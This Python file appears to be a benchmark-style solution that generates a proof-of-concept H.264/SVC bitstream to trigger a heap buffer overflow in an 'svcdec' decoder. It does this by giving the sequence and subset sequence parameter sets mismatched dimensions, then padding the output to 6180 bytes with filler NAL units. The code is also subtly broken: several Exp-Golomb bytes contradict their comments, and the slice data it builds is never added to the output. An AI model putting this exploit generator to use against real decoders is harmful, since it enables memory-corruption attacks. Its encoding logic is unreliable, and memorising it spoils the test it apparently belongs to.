import os
import struct
import tempfile
import subprocess
import threading
import sys
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Based on the vulnerability description:
        # Heap buffer overflow in svcdec when decoder display dimensions
        # do not match the subset sequence dimensions.
        
        # We need to create a video file that has mismatching display
        # dimensions and subset sequence dimensions in SVC (Scalable Video Coding).
        # The target length is 6180 bytes.
        
        # We'll create an SVC bitstream with intentionally mismatched dimensions.
        # Structure based on H.264/SVC format with NAL units.
        
        poc = bytearray()
        
        # Start with a Sequence Parameter Set (SPS) NAL unit
        # We'll create an SPS with specific dimensions
        
        # NAL unit header: forbidden_zero_bit=0, nal_ref_idc=3, nal_unit_type=7 (SPS)
        nal_header = 0x67  # binary: 01100111
        
        # SPS data structure
        sps = bytearray()
        
        # profile_idc: 100 for High profile
        sps.append(100)
        
        # constraint_set flags
        sps.append(0)
        
        # level_idc
        sps.append(30)  # Level 3.0
        
        # seq_parameter_set_id (UEV)
        sps.append(0x80 | 0)  # u(1)=1, ue(v)=0
        
        # log2_max_frame_num_minus4
        sps.append(0xFC | 0)  # ue(v)=0
        
        # pic_order_cnt_type
        sps.append(0xE0 | 0)  # ue(v)=0
        
        # log2_max_pic_order_cnt_lsb_minus4
        sps.append(0xFC | 0)  # ue(v)=0
        
        # num_ref_frames
        sps.append(0x80 | 1)  # ue(v)=1
        
        # gaps_in_frame_num_value_allowed_flag
        sps.append(0x80)  # u(1)=1, u(1)=0
        
        # pic_width_in_mbs_minus1 (UEV) - Base layer width: 176/16-1 = 10
        sps.extend([0x84])  # ue(v)=10 (binary: 0001010 -> 1,0,0,0,0,1,0 -> exp-golomb)
        
        # pic_height_in_map_units_minus1 (UEV) - Base layer height: 144/16-1 = 8
        sps.extend([0x44])  # ue(v)=8 (binary: 0001000 -> 1,0,0,0 -> exp-golomb)
        
        # frame_mbs_only_flag = 1
        sps.append(0x80)
        
        # direct_8x8_inference_flag = 1
        sps.append(0x80)
        
        # frame_cropping_flag = 1 (we'll use this to set display dimensions)
        sps.append(0x80)
        
        # frame_crop_left_offset (UEV) = 0
        sps.append(0x80)
        
        # frame_crop_right_offset (UEV) = (width - display_width)/2
        # We'll set this to create mismatch
        sps.extend([0x84])  # ue(v)=10
        
        # frame_crop_top_offset (UEV) = 0
        sps.append(0x80)
        
        # frame_crop_bottom_offset (UEV) = (height - display_height)/2
        sps.extend([0x84])  # ue(v)=10
        
        # vui_parameters_present_flag = 0
        sps.append(0x00)
        
        # Now create a subset SPS for SVC with different dimensions
        subset_sps_header = 0x6F  # NAL unit type 15: subset SPS
        
        subset_sps = bytearray(sps)
        # Modify dimensions in subset SPS to create mismatch
        # Change width to 352/16-1 = 21
        subset_sps[8] = 0x94  # ue(v)=21
        # Change height to 288/16-1 = 17
        subset_sps[9] = 0x4C  # ue(v)=17
        
        # Add start code prefix and NAL unit
        start_code = b'\x00\x00\x00\x01'
        
        poc.extend(start_code)
        poc.append(nal_header)
        poc.extend(sps)
        
        # Add subset SPS
        poc.extend(start_code)
        poc.append(subset_sps_header)
        poc.extend(subset_sps)
        
        # Add Picture Parameter Set (PPS)
        poc.extend(start_code)
        poc.append(0x68)  # PPS NAL unit
        pps_data = bytes([0x80, 0x00, 0x00, 0x00])
        poc.extend(pps_data)
        
        # Add a slice with incorrect dimension references
        poc.extend(start_code)
        poc.append(0x65)  # IDR slice
        slice_data = bytearray()
        
        # first_mb_in_slice (UEV) = 0
        slice_data.append(0x80)
        
        # slice_type (UEV) = 2 (I slice)
        slice_data.append(0x84)
        
        # pic_parameter_set_id (UEV) = 0
        slice_data.append(0x80)
        
        # frame_num = 0
        slice_data.append(0x00)
        
        # Add some payload data to reach target size
        # Fill with pattern that might trigger overflow
        target_size = 6180
        current_size = len(poc)
        
        if current_size < target_size:
            # Add filler NAL units
            filler = bytearray()
            
            # Create padding with incrementing values
            for i in range(target_size - current_size):
                filler.append(i & 0xFF)
            
            # Add filler as separate NAL units
            chunk_size = 1024
            for i in range(0, len(filler), chunk_size):
                poc.extend(start_code)
                poc.append(0x0C)  # Filler data NAL unit type
                poc.extend(filler[i:i+chunk_size])
        
        # Trim or extend to exact size
        if len(poc) > target_size:
            poc = poc[:target_size]
        elif len(poc) < target_size:
            # Add more filler
            additional = target_size - len(poc)
            poc.extend(bytes([0xFF] * additional))
        
        # Verify size
        assert len(poc) == target_size
        
        return bytes(poc)